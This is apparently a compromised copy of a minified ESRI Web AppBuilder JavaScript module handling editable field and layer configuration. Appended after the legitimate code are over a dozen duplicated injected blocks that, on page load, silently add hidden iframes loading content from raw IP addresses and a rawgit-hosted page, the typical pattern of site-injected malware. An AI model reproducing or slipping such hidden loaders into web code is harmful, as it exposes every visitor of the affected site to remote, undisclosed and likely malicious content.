// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array esri/geometry/Extent jimu/utils esri/dijit/AttributeInspector".split(" "),function(m,k,g,n,p,q){var f={};f.ATI=m([q],{constructor:function(){this._aiConnects=[];this._selection=[];this._toolTips=[]}});f.checkIfFieldAliasAlreadyExists=function(a,b){return 0<=a.split(",").indexOf(b)};f.pointToExtent=function(a,b,c){var d=a.extent.getWidth()/a.width;c*=d;return new n(b.x-c,b.y-c,b.x+c,b.y+c,a.spatialReference)};f.filterOnlyUpdatedAttributes=
function(a,b,c){if(null===b||void 0===b)return a;var d={},e;for(e in a)a.hasOwnProperty(e)&&(e===c.objectIdField||e===c.globalIdField?d[e]=a[e]:null===a[e]&&""===b[e]||a[e]===b[e]||(d[e]=a[e]));return d};f.mergeFieldInfosWithConfiguration=function(a,b){var c=[],d=this.getDefaultEditableFieldInfos(a,!1);b&&b.fieldInfos?(g.forEach(b.fieldInfos,function(a){g.some(d,function(b){if(a.fieldName===b.fieldName)return c.push(this.mergeLastToFirst(b,a)),!0},this)},this),g.forEach(d,function(a){0===g.filter(c,
function(b){return b.fieldName===a.fieldName},this).length&&c.push(a)},this)):c=d;var e=[];a.layerObject.hasOwnProperty("globalIdField")&&void 0!==a.layerObject.globalIdField&&null!==a.layerObject.globalIdField&&e.push(a.layerObject.globalIdField);a.layerObject.hasOwnProperty("objectIdField")&&void 0!==a.layerObject.objectIdField&&null!==a.layerObject.objectIdField&&e.push(a.layerObject.objectIdField);if(a.layerObject.hasOwnProperty("editFieldsInfo")&&void 0!==a.layerObject.editFieldsInfo&&null!==
a.layerObject.editFieldsInfo)for(var l in a.layerObject.editFieldsInfo)a.layerObject.editFieldsInfo.hasOwnProperty(l)&&e.push(a.layerObject.editFieldsInfo[l]);return c=c.filter(function(a){return-1!==g.indexOf(e,a.fieldName)?!1:a.isEditableOnLayer})};f.getDefaultEditableFieldInfos=function(a,b){var c=[],d=this.getFieldInfosFromWebmap(a);a=this.getFieldInfosLayer(a);if(void 0===d||null===d)d=a;else{var e=[];g.forEach(a,function(a){0===g.filter(d,function(b){return b.name===a.fieldName}).length&&(a.isEditableOnLayer=
a.editable,e.push(a))});0<e.length&&(d=d.concat(e))}g.forEach(d,function(a){!1===a.hasOwnProperty("isEditableOnLayer")&&(a.isEditableOnLayer=a.editable);!1===a.editable&&(a.isEditable=a.editable);!1===a.isEditable&&(a.editable=a.isEditable);a.fieldName=a.name;a.canPresetValue=!1;!0===a.editable&&!0===b?c.push(k.clone(a)):!1===b&&c.push(k.clone(a))});return c};f.getFieldInfosFromWebmap=function(a){var b=null,c=a.getPopupInfo();c&&c.fieldInfos&&(b=[],g.forEach(c.fieldInfos,function(c){g.some(a.layerObject.fields,
function(a){if(a.name===c.fieldName)return a=this.mergeFirstToLast(c,a),a.format&&a.format.dateFormat&&a.format.dateFormat.toLowerCase()&&0<=a.format.dateFormat.toLowerCase().indexOf("time")&&(a.format.time=!0),b.push(a),!0},this)},this));return b};f.getFieldInfosLayer=function(a){var b=[];a&&a.layerObject&&g.forEach(a.layerObject.fields,function(a){var c=p.getDefaultPortalFieldInfo(a),c=this.mergeFirstToLast(c,a);c.format&&c.format.dateFormat&&c.format.dateFormat.toLowerCase()&&0<=c.format.dateFormat.toLowerCase().indexOf("time")&&
(c.format.time=!0);c.visible=!0;b.push(c)},this);return b};f.getConfigInfos=function(a,b,c,d){var e=[];g.forEach(a.getLayerInfoArrayOfWebmap(),function(a){var f=!1;"Feature Layer"===a.layerObject.type&&a.layerObject.url&&(a.layerObject.isEditable&&a.layerObject.isEditable()&&c?f=!0:c&&!1===c&&(f=!0));if(!0===f){var h=this.getConfigInfo(a,b);h.layerInfo=a;!0===h.featureLayer.layerAllowsDelete&&!1===h.featureLayer.layerAllowsCreate&&!1===h.featureLayer.layerAllowsUpdate?console.warn(h.layerInfo.title+
" delete only not supported"):d&&!0===d?!0===g.some(b,function(a){return a.featureLayer.id===h.featureLayer.id})&&e.push(h):e.push(h)}},this);return e};f.getConfigInfo=function(a,b){var c=null,d=this.createDefaultConfigInfo(a);!1===g.some(b,function(b){return b.featureLayer&&b.featureLayer.id===a.layerObject.id?(c=k.clone(b),c.fieldInfos=this.mergeFieldInfosWithConfiguration(a,c),c=this.mergeDefaultWithConfig(c,d),c._editFlag=!0):!1},this)&&(c=d);return c};f.mergeDefaultWithConfig=function(a,b){a.featureLayer=
b.featureLayer;!0===a.allowDelete&&!1===a.featureLayer.layerAllowsDelete&&(a.allowDelete=!1);!1===a.disableGeometryUpdate&&!1===a.featureLayer.layerAllowGeometryUpdates&&(a.disableGeometryUpdate=!0);!1===a.featureLayer.layerAllowsCreate&&!0===a.featureLayer.layerAllowsUpdate&&(a.allowUpdateOnly=!0);return a};f.createDefaultConfigInfo=function(a){var b=!1,c=!1,d=!1,e=!1;try{var f=a.layerObject.getEditCapabilities();f.canCreate&&(b=!0);f.canUpdate&&(e=c=!0);f.canDelete&&(d=!0)}catch(r){a.layerObject.hasOwnProperty("capabilities")&&
(-1===String(a.layerObject.capabilities).indexOf("Update")&&-1===String(a.layerObject.capabilities).indexOf("Delete")&&-1===String(a.layerObject.capabilities).indexOf("Create")&&-1!==String(a.layerObject.capabilities).indexOf("Editing")?b=d=c=!0:(-1!==String(a.layerObject.capabilities).indexOf("Update")&&(e=c=!0),-1!==String(a.layerObject.capabilities).indexOf("Delete")&&(d=!0),-1!==String(a.layerObject.capabilities).indexOf("Create")&&(b=!0)))}a.layerObject.hasOwnProperty("allowGeometryUpdates")&&
(e=a.layerObject.allowGeometryUpdates);return{featureLayer:{id:a.layerObject.id,layerAllowsCreate:b,layerAllowsUpdate:c,layerAllowsDelete:d,layerAllowGeometryUpdates:e},disableGeometryUpdate:!e,allowUpdateOnly:!b,allowDelete:!1,fieldInfos:this.mergeFieldInfosWithConfiguration(a,null),_editFlag:!1}};f.mergeLastToFirst=function(){for(var a={},b=0,c=arguments.length,d;b<c;b++)for(d in arguments[b])arguments[b].hasOwnProperty(d)&&(a[d]=arguments[b][d]);return a};f.mergeFirstToLast=function(){for(var a=
{},b=arguments.length-1,c;0<=b;b--)for(c in arguments[b])arguments[b].hasOwnProperty(c)&&(a[c]=arguments[b][c]);return a};f.isObjectEmpty=function(a){if(a)for(var b in a)if(a.hasOwnProperty(b))return!1;return!0};f.addDateTimeFormat=function(a){a&&a.format&&null!==a.format&&a.format.dateFormat&&null!==a.format.dateFormat&&0<=a.format.dateFormat.toString().toUpperCase().indexOf("TIME")&&(a.format.time=!0)};return f});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});